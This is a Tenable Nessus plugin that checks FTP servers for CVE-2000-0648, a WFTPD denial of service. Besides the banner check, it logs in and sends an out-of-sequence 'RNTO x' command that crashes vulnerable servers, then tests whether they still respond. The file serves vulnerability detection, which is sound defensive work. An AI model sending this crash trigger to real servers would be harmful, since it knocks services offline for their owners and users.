#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
  script_id(10466);
  script_version ("$Revision: 1.37 $");
  script_cvs_date("$Date: 2017/01/16 15:05:10 $");

  script_cve_id("CVE-2000-0648");
  script_bugtraq_id(1456);
  script_osvdb_id(365);
  script_xref(name:"EDB-ID", value:"20069");

  script_name(english:"WFTPD Out-of-Sequence RNTO Command DoS");
  script_summary(english:"Crashes the remote FTP server.");

  script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a denial of service
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The FTP server running on the remote host is affected by a denial of
service vulnerability when executing a RENAME TO (RNTO) command. An
authenticated, remote attacker can crash the FTP server by executing
the RENAME TO command before a RENAME FROM (RNFR) command.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Jul/135");
  script_set_attribute(attribute:"solution", value:
"If you are using the Texas Imperial Software WFTPD server, then
upgrade to version 2.41 RC11 or later. Otherwise, contact the vendor
for a fix.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2000/07/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2000/07/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:texas_imperial_software:wftpd");
  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"FTP");

  script_copyright(english:"This script is Copyright (C) 2000-2017 Tenable Network Security, Inc.");

  script_dependencie("ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_require_keys("ftp/login", "Settings/ParanoidReport");

  exit(0);
}

#
# The script code starts here
#
include("audit.inc");
include("global_settings.inc");
include("ftp_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_ftp_port(default: 21);

if(safe_checks())
{
  banner = get_ftp_banner(port: port);

  if (! banner) audit(AUDIT_NO_BANNER, port);

  if("WFTP" >< banner)
  {
    txt = '\nNessus reports this vulnerability using only information gathered' +
          '\nvia the banner. Use caution when testing without safe checks enabled.' +
          '\n';
    security_warning(port:port, extra: txt);
    exit(0);
  }
  else audit(AUDIT_HOST_NOT, 'affected');
}

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");
soc = open_sock_tcp(port);
if (! soc) audit(AUDIT_SOCK_FAIL, port, 'FTP');

if (login)
{
  if(ftp_authenticate(socket:soc, user:login, pass:pass))
  {
    req = 'RNTO x\r\n';
    send(socket:soc, data:req);
    ftp_close(socket:soc);

    soc2 = open_sock_tcp(port);

    if ( ! soc2 ) audit(AUDIT_SOCK_FAIL, port, 'FTP');

    r = ftp_recv_line(socket:soc2);
    ftp_close(socket: soc2);

    if(!r)
    {
      security_warning(port);
      exit(0);
    }
    else audit(AUDIT_HOST_NOT, 'affected');
  }
  else
  {
    ftp_close(socket: soc);
    soc = open_sock_tcp(port);
    if (! soc ) audit(AUDIT_SOCK_FAIL, port, 'FTP');
  }
}

r = ftp_recv_line(socket:soc);
ftp_close(socket: soc);
if("WFTPD 2.4 service" >< r)
{
  txt ='\nThe remote FTP server *may* be affected by a denial of service' +
       '\nvulnerability; however, Nessus could not check for it since it could' +
       '\nnot log into the server.' +
       '\nEnsure that you are running WFTPD version 2.41 RC11 or later, or an' +
       '\nattacker with a valid login and password may shut down this server.' +
       '\n';
  security_warning(port:port, extra: txt);
  exit(0);
}
else audit(AUDIT_HOST_NOT, 'affected');
